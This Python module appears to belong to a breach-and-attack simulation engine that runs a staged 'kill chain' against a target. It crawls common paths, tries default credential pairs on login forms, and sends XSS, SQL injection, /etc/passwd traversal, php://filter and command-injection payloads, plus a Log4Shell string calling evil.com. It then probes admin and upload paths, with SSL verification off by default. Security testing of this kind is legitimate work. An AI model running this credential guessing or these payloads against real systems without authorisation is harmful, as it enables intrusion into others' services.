"""
Adaptive APT Kill Chain v3 – FIXED & ENHANCED
Enterprise Adaptive BAS Engine

Features:
- Dynamic target support
- Recursive link discovery (with per‑stage budget)
- Technology fingerprinting (expanded)
- Login discovery and REAL credential validation
- Admin panel discovery with correct severity
- OWASP payload validation (XSS, SQLi, Path Traversal, Log4Shell)
- Persistence probing
- WAF-aware behavior with configurable SSL verification
- Per‑stage request limits and global timeouts
- Extensive logging and telemetry
- Smart recon filtering with false‑positive reduction
"""

import aiohttp
import asyncio
import logging
import urllib.parse
import re
import ssl
import time
from typing import List, Dict, Any, Optional, Set, Tuple

from bs4 import BeautifulSoup
from urllib.parse import urlparse, urljoin

from bas_engine.attack_modules.utils.endpoint_validator import is_real_endpoint
from .base import BaseAttackModule
from bas_engine.models.simulation import Severity

logger = logging.getLogger("secureforge.apt_killchain")


# =========================================================
# CONFIGURATION (global defaults, can be overridden)
# =========================================================

FAST_MODE = True

# Per‑stage request budgets
MAX_RECON_REQUESTS = 30
MAX_LOGIN_REQUESTS = 20
MAX_OWASP_REQUESTS = 30
MAX_PRIV_ESC_REQUESTS = 15
MAX_PERSISTENCE_REQUESTS = 15
MAX_TOTAL_REQUESTS = 200  # Global safety cap

DELAY_BETWEEN = 0.12
MAX_RECURSIVE_LINKS = 25
REQUEST_TIMEOUT = 6.0
DEFAULT_SSL_VERIFY = False   # Change to True for production environments

COMMON_DISCOVERY_PATHS = [
    "/",
    "/login",
    "/signin",
    "/admin",
    "/dashboard",
    "/api",
    "/graphql",
    "/upload",
    "/register",
    "/auth",
    "/manage",
    "/config",
    "/backup",
    "/cgi-bin",
    "/phpmyadmin",
    "/webmail",
    "/roundcube",
    "/moodle",
    "/wordpress",
    "/wp-admin",
]

COMMON_ADMIN_PATHS = [
    "/admin",
    "/admin/login",
    "/dashboard",
    "/manage",
    "/config",
    "/settings",
    "/administrator",
    "/console",
    "/manager",
    "/control",
    "/system",
    "/administration",
    "/cpanel",
    "/webmin",
    "/plesk",
]

COMMON_PERSISTENCE_PATHS = [
    "/upload",
    "/uploads",
    "/backup",
    "/backups",
    "/plugins",
    "/extensions",
    "/api/upload",
    "/storage",
    "/files",
    "/documents",
    "/images",
    "/media",
    "/download",
    "/export",
]

LOGIN_WORDS = [
    "login",
    "signin",
    "username",
    "password",
    "email",
    "user",
    "pass",
    "auth",
    "logon",
]

# Expanded payload library
PAYLOADS = [
    ("XSS", "<script>alert(1)</script>", "T1190"),
    ("SQLI", "' UNION SELECT NULL,NULL--", "T1190"),
    ("TRAVERSAL", "../../../../etc/passwd", "T1190"),
    ("LOG4SHELL", "${jndi:ldap://evil.com/x}", "T1190"),
    ("XSS_EVENT", "<img src=x onerror=alert(1)>", "T1190"),
    ("SQLI_SLEEP", "' OR SLEEP(5)--", "T1190"),
    ("LFI", "php://filter/convert.base64-encode/resource=/etc/passwd", "T1190"),
    ("RCE", "; echo vulnerable", "T1203"),
]

# Expanded credential list
CREDENTIAL_LIST = [
    ("admin", "admin"),
    ("admin", "password"),
    ("administrator", "administrator"),
    ("test", "test"),
    ("user", "password"),
    ("root", "root"),
    ("admin", "123456"),
    ("admin", "admin123"),
    ("guest", "guest"),
    ("operator", "operator"),
    ("manager", "manager"),
]


# =========================================================
# STATE MANAGEMENT
# =========================================================

class KillChainState:
    """Holds all discovery and attack state across stages."""

    def __init__(self):
        self.discovery = {
            "logins": [],
            "admin_panels": [],
            "forms": [],
            "technologies": [],
            "uploads": [],
            "api_endpoints": [],
            "links": [],
            "all_urls": set(),
            "visited_urls": set(),
        }
        self.authenticated = False
        self.valid_creds = None
        self.stage_results = {}
        self.attack_results = []
        self.request_count = 0

    def record_stage(
        self,
        stage_num: int,
        name: str,
        status: str,
        detail: str,
    ):
        self.stage_results[stage_num] = {
            "stage": stage_num,
            "name": name,
            "status": status,
            "detail": detail,
        }
        icon_map = {
            "success": "✓",
            "partial": "⚠",
            "error": "✗",
            "vulnerable": "⚠",
            "none": "ℹ",
        }
        icon = icon_map.get(status, "?")
        logger.info(f"\n[{icon}] Stage {stage_num}: {name}")
        logger.info(f"    {detail}")


# =========================================================
# MAIN MODULE CLASS
# =========================================================

class APTKillChainModule(BaseAttackModule):
    MODULE_NAME = "apt_killchain"
    DESCRIPTION = "Adaptive enterprise kill chain simulation"
    MITRE_TACTIC = "Multiple"
    MITRE_IDS = [
        "T1595",  # Reconnaissance
        "T1110",  # Credential Access
        "T1078",  # Valid Accounts
        "T1190",  # Exploit Public-Facing
        "T1548",  # Privilege Escalation
        "T1505",  # Persistence
    ]

    # =====================================================
    # URL HELPERS
    # =====================================================

    def normalize_url(self, path: str, target: str) -> str:
        parsed = urlparse(target)
        base = f"{parsed.scheme}://{parsed.netloc}"
        return urljoin(base, path)

    def same_domain(self, url: str, target: str) -> bool:
        try:
            return urlparse(url).netloc == urlparse(target).netloc
        except Exception:
            return False

    # =====================================================
    # TECHNOLOGY FINGERPRINTING
    # =====================================================

    def fingerprint_technologies(self, headers: dict, body: str) -> List[str]:
        tech = set()
        server = headers.get("server", "").lower()
        powered = headers.get("x-powered-by", "").lower()
        body_lower = body.lower()

        # Web servers
        if "nginx" in server:
            tech.add("nginx")
        if "apache" in server:
            tech.add("apache")
        if "iis" in server:
            tech.add("iis")
        if "tomcat" in server:
            tech.add("tomcat")
        if "caddy" in server:
            tech.add("caddy")

        # Backend frameworks
        if "php" in powered or "php" in body_lower:
            tech.add("php")
        if "django" in body_lower:
            tech.add("django")
        if "flask" in body_lower:
            tech.add("flask")
        if "laravel" in body_lower:
            tech.add("laravel")
        if "express" in body_lower:
            tech.add("express")
        if "rails" in body_lower:
            tech.add("rails")
        if "spring" in body_lower:
            tech.add("spring")
        if "asp.net" in body_lower or "aspnet" in body_lower:
            tech.add("asp.net")

        # Frontend
        if "react" in body_lower:
            tech.add("react")
        if "next.js" in body_lower:
            tech.add("nextjs")
        if "vue" in body_lower:
            tech.add("vue")
        if "angular" in body_lower:
            tech.add("angular")
        if "jquery" in body_lower:
            tech.add("jquery")

        # CMS
        if "wordpress" in body_lower:
            tech.add("wordpress")
        if "drupal" in body_lower:
            tech.add("drupal")
        if "joomla" in body_lower:
            tech.add("joomla")
        if "moodle" in body_lower:
            tech.add("moodle")
        if "roundcube" in body_lower:
            tech.add("roundcube")

        return sorted(list(tech))

    # =====================================================
    # RECURSIVE LINK DISCOVERY
    # =====================================================

    async def recursive_discovery(
        self,
        session,
        state: KillChainState,
        url: str,
        target: str,
        budget: int,
    ):
        if len(state.discovery["links"]) >= MAX_RECURSIVE_LINKS:
            return
        if state.request_count >= budget:
            return
        if url in state.discovery["visited_urls"]:
            return
        state.discovery["visited_urls"].add(url)

        try:
            async with session.get(
                url,
                timeout=REQUEST_TIMEOUT,
                allow_redirects=True,
            ) as resp:
                body = await resp.text()
                soup = BeautifulSoup(body, "html.parser")
                for tag in soup.find_all("a"):
                    href = tag.get("href")
                    if not href:
                        continue
                    full = urljoin(url, href)
                    if not self.same_domain(full, target):
                        continue
                    if full in state.discovery["links"]:
                        continue
                    state.discovery["links"].append(full)
                    state.discovery["all_urls"].add(full)
        except Exception as e:
            logger.debug(f"Recursive discovery error on {url}: {e}")

    # =====================================================
    # STAGE 1 — RECONNAISSANCE
    # =====================================================

    async def stage_recon(
        self,
        session,
        state: KillChainState,
        target: str,
    ):
        logger.info("\n=== STAGE 1 — RECON ===")
        discovered = []
        budget = MAX_RECON_REQUESTS

        for path in COMMON_DISCOVERY_PATHS:
            if state.request_count >= budget:
                logger.info(f"Recon budget exhausted ({budget} requests)")
                break

            url = self.normalize_url(path, target)
            try:
                async with session.get(
                    url,
                    timeout=REQUEST_TIMEOUT,
                    allow_redirects=True,
                ) as resp:
                    status = resp.status
                    body = await resp.text()
                    headers = {k.lower(): v for k, v in resp.headers.items()}
                    state.request_count += 1
                    logger.info(f"[{status}] {url}")

                    if status in (200, 301, 302, 401, 403):
                        discovered.append(url)
                        state.discovery["all_urls"].add(url)

                    tech = self.fingerprint_technologies(headers, body)
                    for t in tech:
                        if t not in state.discovery["technologies"]:
                            state.discovery["technologies"].append(t)

                    soup = BeautifulSoup(body, "html.parser")
                    forms = soup.find_all("form")
                    for form in forms:
                        form_text = str(form).lower()
                        if any(word in form_text for word in LOGIN_WORDS):
                            if url not in state.discovery["logins"]:
                                state.discovery["logins"].append(url)

                    if any(x in url.lower() for x in ["admin", "dashboard", "manage"]):
                        state.discovery["admin_panels"].append(url)

                    if any(x in url.lower() for x in ["api", "graphql", "rest"]):
                        state.discovery["api_endpoints"].append(url)

                    await self.recursive_discovery(
                        session, state, url, target, budget
                    )

            except Exception as e:
                logger.info(f"[E] {url} : {e}")

            await asyncio.sleep(DELAY_BETWEEN)

        state.record_stage(
            1,
            "Reconnaissance",
            "success",
            f"Discovered {len(discovered)} valid endpoints | "
            f"{len(state.discovery['links'])} recursive links | "
            f"Technologies: {', '.join(state.discovery['technologies']) or 'none'}"
        )

    # =====================================================
    # STAGE 2 — LOGIN ATTACK
    # =====================================================

    async def stage_login_attack(
        self,
        session,
        state: KillChainState,
    ):
        logger.info("\n=== STAGE 2 — LOGIN ATTACK ===")
        if not state.discovery["logins"]:
            state.record_stage(
                2, "Credential Attack", "partial", "No login forms discovered"
            )
            return

        budget = MAX_LOGIN_REQUESTS
        attempts = 0

        for login_url in state.discovery["logins"]:
            for username, password in CREDENTIAL_LIST:
                if state.request_count >= budget:
                    break

                attempts += 1
                try:
                    data = {"username": username, "password": password}
                    async with session.post(
                        login_url,
                        data=data,
                        allow_redirects=True,
                        timeout=REQUEST_TIMEOUT,
                    ) as resp:
                        final_url = str(resp.url)
                        status = resp.status
                        body = await resp.text()
                        state.request_count += 1

                        logger.info(f"[{status}] {username}:{password} -> {final_url}")

                        # Real success detection
                        success = False
                        if final_url != login_url and not any(
                            word in final_url.lower() for word in ("login", "auth")
                        ):
                            has_login_form = any(
                                word in body.lower() for word in ("login", "username", "password")
                            ) and ('form' in body.lower() or 'input' in body.lower())

                            if not has_login_form and status in (200, 302, 303):
                                success = True

                        if not success:
                            if any(w in body.lower() for w in ("logout", "dashboard", "welcome")):
                                success = True

                        if success:
                            state.authenticated = True
                            state.valid_creds = (username, password)
                            state.record_stage(
                                2,
                                "Credential Attack",
                                "success",
                                f"Valid credentials found: {username}:{password}"
                            )
                            return

                except Exception as e:
                    logger.info(f"[E] {e}")

                await asyncio.sleep(DELAY_BETWEEN)

        state.record_stage(
            2, "Credential Attack", "partial",
            f"{attempts} attempts completed; no valid credentials found"
        )

    # =====================================================
    # STAGE 3 — SESSION VALIDATION
    # =====================================================

    async def stage_session_validation(
        self,
        session,
        state: KillChainState,
    ):
        logger.info("\n=== STAGE 3 — SESSION VALIDATION ===")
        if state.authenticated:
            state.record_stage(
                3,
                "Credential Use",
                "success",
                f"Authenticated session established with {state.valid_creds[0]}"
            )
        else:
            state.record_stage(
                3,
                "Credential Use",
                "partial",
                "No authenticated session"
            )

    # =====================================================
    # STAGE 4 — OWASP ATTACKS
    # =====================================================

    async def stage_owasp(
        self,
        session,
        state: KillChainState,
    ):
        logger.info("\n=== STAGE 4 — OWASP ATTACKS ===")
        blocked = 0
        bypassed = 0

        targets = list(set(state.discovery["logins"] + state.discovery["links"]))
        if not targets:
            state.record_stage(
                4,
                "OWASP Attacks",
                "partial",
                "No attackable endpoints discovered"
            )
            return

        budget = MAX_OWASP_REQUESTS
        for url in targets[:15]:
            if state.request_count >= budget:
                break
            for label, payload, mitre in PAYLOADS:
                if state.request_count >= budget:
                    break
                attack_url = f"{url}?q={urllib.parse.quote(payload)}"
                try:
                    async with session.get(
                        attack_url,
                        timeout=REQUEST_TIMEOUT,
                        allow_redirects=False,
                    ) as resp:
                        status = resp.status
                        state.request_count += 1
                        if status in (403, 406, 429):
                            blocked += 1
                            outcome = "BLOCKED"
                        else:
                            bypassed += 1
                            outcome = "BYPASSED"
                        logger.info(f"[{outcome}] {label} {status}")
                        state.attack_results.append({
                            "label": label,
                            "status": status,
                            "url": attack_url,
                            "blocked": outcome == "BLOCKED"
                        })
                except Exception as e:
                    logger.info(f"[E] {e}")
                await asyncio.sleep(DELAY_BETWEEN)

        state.record_stage(
            4,
            "OWASP Attacks",
            "success",
            f"Blocked={blocked}, Bypassed={bypassed}"
        )

    # =====================================================
    # STAGE 5 — PRIVILEGE ESCALATION
    # =====================================================

    async def stage_priv_esc(
        self,
        session,
        state: KillChainState,
        target: str,
    ):
        logger.info("\n=== STAGE 5 — PRIV ESC ===")
        accessible = []

        budget = MAX_PRIV_ESC_REQUESTS
        for path in COMMON_ADMIN_PATHS:
            if state.request_count >= budget:
                break
            url = self.normalize_url(path, target)
            try:
                async with session.get(
                    url,
                    timeout=REQUEST_TIMEOUT,
                    allow_redirects=False,
                ) as resp:
                    status = resp.status
                    state.request_count += 1
                    logger.info(f"[{status}] {url}")
                    if status == 200:
                        body = await resp.text()
                        if len(body) > 100 and "404" not in body:
                            accessible.append(url)
            except Exception as e:
                logger.info(f"[E] {e}")
            await asyncio.sleep(DELAY_BETWEEN)

        if accessible:
            state.record_stage(
                5,
                "Privilege Escalation",
                "vulnerable",
                f"{len(accessible)} admin endpoints accessible: {', '.join(accessible[:3])}"
            )
        else:
            state.record_stage(
                5,
                "Privilege Escalation",
                "none",
                "No exposed admin endpoints"
            )

    # =====================================================
    # STAGE 6 — PERSISTENCE PROBE
    # =====================================================

    async def stage_persistence(
        self,
        session,
        state: KillChainState,
        target: str,
    ):
        logger.info("\n=== STAGE 6 — PERSISTENCE ===")
        risky = []

        budget = MAX_PERSISTENCE_REQUESTS
        for path in COMMON_PERSISTENCE_PATHS:
            if state.request_count >= budget:
                break
            url = self.normalize_url(path, target)
            try:
                async with session.get(
                    url,
                    timeout=REQUEST_TIMEOUT,
                    allow_redirects=False,
                ) as resp:
                    status = resp.status
                    state.request_count += 1
                    logger.info(f"[{status}] {url}")
                    if status == 200:
                        body = await resp.text()
                        if len(body) > 100 and "404" not in body:
                            risky.append(url)
            except Exception as e:
                logger.info(f"[E] {e}")
            await asyncio.sleep(DELAY_BETWEEN)

        if risky:
            state.record_stage(
                6,
                "Persistence Probe",
                "vulnerable",
                f"{len(risky)} persistence paths exposed: {', '.join(risky[:3])}"
            )
        else:
            state.record_stage(
                6,
                "Persistence Probe",
                "none",
                "No persistence paths exposed"
            )

    # =====================================================
    # MAIN EXECUTION
    # =====================================================

    async def execute(self) -> List[Any]:
        findings = []
        state = KillChainState()

        # Load configuration from options
        ssl_verify = self.options.get("ssl_verify", DEFAULT_SSL_VERIFY)
        global_timeout = self.options.get("global_timeout", 300)

        resolved = await self.resolve_target()
        target = resolved.original

        logger.info("\n" + "=" * 60)
        logger.info("Adaptive APT Kill Chain v3 (Fixed & Enhanced)")
        logger.info(f"TARGET: {target}")
        logger.info(f"SSL Verify: {ssl_verify}")

        # ⚠️ Warning if SSL verification is disabled
        if not ssl_verify:
            logger.warning("=" * 60)
            logger.warning("⚠️  SSL CERTIFICATE VERIFICATION IS DISABLED!")
            logger.warning("   This is acceptable for internal/lab testing but")
            logger.warning("   exposes the tool to MITM attacks in production.")
            logger.warning("   Set 'ssl_verify': True in module options to enable.")
            logger.warning("=" * 60)

        logger.info("=" * 60)

        # SSL context
        ssl_ctx = ssl.create_default_context()
        if not ssl_verify:
            ssl_ctx.check_hostname = False
            ssl_ctx.verify_mode = ssl.CERT_NONE

        connector = aiohttp.TCPConnector(ssl=ssl_ctx)

        async with aiohttp.ClientSession(connector=connector) as session:
            try:
                await asyncio.wait_for(
                    self._run_all_stages(session, state, target),
                    timeout=global_timeout
                )
            except asyncio.TimeoutError:
                logger.warning(f"APT Kill Chain timed out after {global_timeout}s")

        # ── Build stage findings ──
        for stage_num, result in state.stage_results.items():
            if result["status"] in ("vulnerable", "partial"):
                severity = Severity.HIGH
            elif result["status"] == "error":
                severity = Severity.CRITICAL
            elif result["status"] == "none":
                severity = Severity.INFO
            else:
                severity = Severity.MEDIUM

            findings.append(
                self.finding(
                    title=f"APT Stage {stage_num}: {result['name']}",
                    description=result["detail"],
                    severity=severity,
                    mitre_id=self.MITRE_IDS[stage_num - 1] if stage_num <= len(self.MITRE_IDS) else None,
                    raw_data=result,
                )
            )

        # ── WAF bypass findings ──
        seen_labels = set()
        for attack in state.attack_results:
            if not attack["blocked"]:
                label = attack.get("label", "Unknown")
                if label in seen_labels:
                    continue
                seen_labels.add(label)
                findings.append(
                    self.finding(
                        title=f"WAF Bypass: {attack['label']}",
                        description="Payload not blocked",
                        severity=Severity.CRITICAL,
                        mitre_id="T1190",
                        raw_data=attack,
                    )
                )

        return findings

    async def _run_all_stages(self, session, state: KillChainState, target: str):
        await self.emit_event("INFO", "[APT] Stage 1: Reconnaissance")
        await self.stage_recon(session, state, target)

        await self.emit_event("INFO", "[APT] Stage 2: Login Attack")
        await self.stage_login_attack(session, state)

        await self.emit_event("INFO", "[APT] Stage 3: Session Validation")
        await self.stage_session_validation(session, state)

        await self.emit_event("INFO", "[APT] Stage 4: OWASP Web Scanning")
        await self.stage_owasp(session, state)

        await self.emit_event("INFO", "[APT] Stage 5: Privilege Escalation Vectors")
        await self.stage_priv_esc(session, state, target)

        await self.emit_event("INFO", "[APT] Stage 6: Persistence Probes")
        await self.stage_persistence(session, state, target)

        await self.emit_event("SUCCESS", "[APT] Kill chain completed")